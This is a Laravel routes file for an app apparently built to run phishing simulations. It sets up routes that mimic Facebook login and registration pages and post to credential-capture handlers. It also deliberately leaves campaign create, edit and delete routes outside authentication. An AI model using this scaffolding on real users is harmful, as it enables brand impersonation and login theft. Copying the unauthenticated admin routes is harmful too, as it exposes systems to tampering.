<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PhishingController; // Import only once
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\CampaignController;
use Illuminate\Support\Facades\Auth;

// Ensure direct access to campaigns without auth
Route::get('/campaigns', [CampaignController::class, 'index'])->name('campaigns.index');
Route::get('/campaigns/create', [CampaignController::class, 'create'])->name('campaigns.create');
Route::post('/campaigns', [CampaignController::class, 'store'])->name('campaigns.store');
Route::get('/campaigns/{campaign}', [CampaignController::class, 'show'])->name('campaigns.show');
Route::get('/campaigns/{campaign}/edit', [CampaignController::class, 'edit'])->name('campaigns.edit');
Route::put('/campaigns/{campaign}', [CampaignController::class, 'update'])->name('campaigns.update');
Route::delete('/campaigns/{campaign}', [CampaignController::class, 'destroy'])->name('campaigns.destroy');

// Auth routes
Auth::routes();

// Use a different name for the phishing login to avoid conflicts with Laravel auth
Route::get('/phishing-login', [PhishingController::class, 'showLoginPage'])
     ->name('phishing.login.page');
Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

// We're defining campaigns routes directly above, so we don't need this anymore
// Route::resource('/campaigns', CampaignController::class);

Route::middleware(['auth'])->group(function () {
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    // Other authenticated routes here
});

// Phishing simulation routes
Route::get('/facebook-login', [PhishingController::class, 'showLoginPage'])->name('phishing.login');
Route::post('/facebook-login', [PhishingController::class, 'captureCredentials'])->name('phishing.capture');
Route::get('/facebook-register', [PhishingController::class, 'showRegisterPage'])->name('phishing.register');
Route::post('/facebook-register', [PhishingController::class, 'captureRegistration'])->name('phishing.register.capture');

// Direct dashboard access
Route::get('/facebook-dashboard', [PhishingController::class, 'showDashboard'])->name('phishing.dashboard');

